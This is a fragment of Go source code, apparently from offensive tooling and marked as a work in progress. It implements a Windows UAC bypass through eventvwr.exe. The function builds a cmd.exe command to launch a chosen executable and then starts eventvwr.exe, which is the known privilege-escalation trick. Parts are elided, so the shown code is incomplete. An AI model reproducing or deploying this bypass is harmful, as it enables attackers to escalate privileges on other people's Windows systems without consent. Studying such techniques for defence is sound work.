...
//////////////////////////////////////////WORKING ON THIS ////////////////////////////////////
//BypassUAC Eventvwr
func Eventvwr(command string, ExecLocation string) ( error)  {

	fPath, err := filepath.Abs(ExecLocation) //add dynamic filepath string
	if err != nil {
		return err
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fPath) //fPath
	...
	cmd := exec.Command("eventvwr.exe")   //change back to eventvwr.exe
